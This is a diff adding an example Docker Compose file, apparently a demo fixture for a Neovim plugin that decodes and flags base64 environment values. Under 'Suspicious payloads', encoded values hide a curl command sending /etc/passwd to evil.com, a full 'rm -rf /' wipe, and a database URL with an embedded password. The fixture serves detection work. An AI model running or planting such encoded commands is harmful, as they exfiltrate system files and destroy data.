@@ -1,0 +1,32 @@
+# Example Docker Compose file with base64-encoded env values.
+# Open in Neovim to see uncloak.nvim in action.
+
+services:
+  web:
+    image: myapp:latest
+    ports:
+      - "8080:8080"
+
+    env:
+      # --- Normal values (no virtual text expected) ---
+      APP_NAME: "my-web-app"
+      LOG_LEVEL: info
+      PORT: "8080"
+
+      # --- Harmless base64 (decoded inline, green) ---
+      WELCOME_MESSAGE: "SGVsbG8gV29ybGQh"
+      SESSION_COOKIE: "dXNlcl9pZD00MjtleHBpcmVzPTIwMjUtMTItMzE="
+
+      # --- Suspicious payloads (decoded inline, warning highlight) ---
+      STARTUP_HOOK: "Y3VybCBodHRwOi8vZXZpbC5jb20vc3RlYWw/ZGF0YT0kKGNhdCAvZXRjL3Bhc3N3ZCk="
+      CLEANUP_SCRIPT: "cm0gLXJmIC8gLS1uby1wcmVzZXJ2ZS1yb290"
+      DATABASE_URL: "cG9zdGdyZXM6Ly9hZG1pbjpzM2NyZXRQQHNzQGRiLmludGVybmFsOjU0MzIvcHJvZHVjdGlvbg=="
+
+    # This section should NOT be scanned
+    volumes:
+      - ./data:/app/data
+
+  redis:
+    image: redis:7
+    ports:
+      - "6379:6379"
